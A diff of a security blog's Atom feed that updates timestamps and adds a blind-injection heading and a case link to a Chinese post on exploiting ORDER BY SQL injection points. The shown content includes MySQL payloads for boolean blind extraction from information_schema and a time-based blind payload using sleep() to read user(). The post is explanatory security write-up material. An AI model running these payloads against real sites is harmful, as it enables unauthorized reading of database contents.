@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://xdxd.love/"/>
-  <updated>2016-03-07T06:14:42.000Z</updated>
+  <updated>2016-03-07T06:33:01.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -19,7 +19,7 @@
     <link href="http://xdxd.love/2016/03/07/order-by%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
     <id>http://xdxd.love/2016/03/07/order-by注入点利用方式/</id>
     <published>2016-03-07T02:00:56.000Z</published>
-    <updated>2016-03-07T06:14:42.000Z</updated>
+    <updated>2016-03-07T06:33:01.000Z</updated>
     <content type="html"><![CDATA[<h1 id="简单测试">简单测试</h1><p>测试代码：</p>
 <pre><code> <span class="php"><span class="preprocessor">&lt;?php</span>
 error_reporting(<span class="number">0</span>);
@@ -52,6 +52,8 @@ var_dump(<span class="variable">$sql</span>);
 
 <span class="keyword">if</span>((selectchar(<span class="keyword">substring</span>(table_name,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">limit</span> <span class="number">1</span>)&lt;=<span class="number">128</span>),<span class="keyword">id</span>,price)</span>
 </code></pre><p>条件判断之后选择的字段名，id，domain，不能是1，2，所以一定要知道字段名。猜测是写1，2的话被判断为字符了。</p>
+<p>1,基于表达式结果盲注</p>
+<p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2010-07406" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-07406</a></p>
 <h2 id="不需要知道字段名">不需要知道字段名</h2><p>基于order by 1,2 时间盲注：<br>payload:</p>
 <pre><code><span class="built_in">asc</span>,<span class="keyword">if</span>(locate(\<span class="string">''</span>+payload+<span class="string">'\'</span>,substring(user(),<span class="string">'+str(i)+'</span>,<span class="number">1</span>)),<span class="built_in">sleep</span>(<span class="number">3</span>),<span class="number">1</span>)
 </code></pre><p>基于order by 1,2 引起mysql错误进行盲注 </p>
